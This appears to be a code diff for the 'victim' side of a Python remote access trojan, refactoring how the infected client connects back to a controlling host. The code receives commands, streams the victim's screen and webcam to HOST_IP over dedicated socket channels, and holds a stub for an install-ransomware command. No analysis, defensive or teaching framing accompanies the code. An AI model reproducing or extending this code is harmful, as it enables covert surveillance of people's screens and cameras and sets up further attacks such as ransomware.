@@ -1,5 +1,6 @@
 import threading
 from victim_constants import *
+from constants import *
 import socket
 import ScreenSharing.sharer.sharer as scSharer
 import WebCamSharing.sharer.sharer as wcSharer
@@ -13,6 +14,8 @@ def connectToServer():
     soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     soc.connect((HOST_IP, HOST_PORT))
     
+    soc.send(COMMANDS_CHANNEL.encode()) # Tell the server we want to use this socket connection as the commands channel
+
     print("Successfully connected!")
 
 def getCommand():
@@ -22,12 +25,10 @@ def getCommand():
 
 def processCommand(command):
     if command == WATCH_SCREEN_COMMAND:
-        ip, port = soc.recv(1024).decode().split(' ')
-        threading.Thread(target= handleScreenSharing, args=(ip, int(port))).start()
+        threading.Thread(target= handleScreenSharing).start()
         
     elif command == WATCH_WEBCAM_COMMAND:
-        ip, port = soc.recv(1024).decode().split(' ')
-        threading.Thread(target= handleWebCameraSharing, args=(ip, int(port))).start()
+        threading.Thread(target= handleWebCameraSharing).start()
 
     elif command == INSTALL_RANSOMWARE_COMMAND:
         pass
@@ -36,15 +37,19 @@ def processCommand(command):
         pass
 
 
-def handleScreenSharing(ip ,port):
+def handleScreenSharing():
     screenShareSoc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    screenShareSoc.connect((ip, port))
+    screenShareSoc.connect((HOST_IP, HOST_PORT))
+
+    screenShareSoc.send(SCREEN_SHARE_CHANNEL.encode()) # Tell the server we want to use this socket connection as the screenShare channel
 
     scSharer.shareScreen(screenShareSoc)
 
-def handleWebCameraSharing(ip ,port):
+def handleWebCameraSharing():
     screenShareSoc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    screenShareSoc.connect((ip, port))
+    screenShareSoc.connect((HOST_IP, HOST_PORT))
+
+    screenShareSoc.send(WEB_CAM_SHARE_CHANNEL.encode()) # Tell the server we want to use this socket connection as the web camera sharing channel
 
     wcSharer.shareWebCam(screenShareSoc)
 
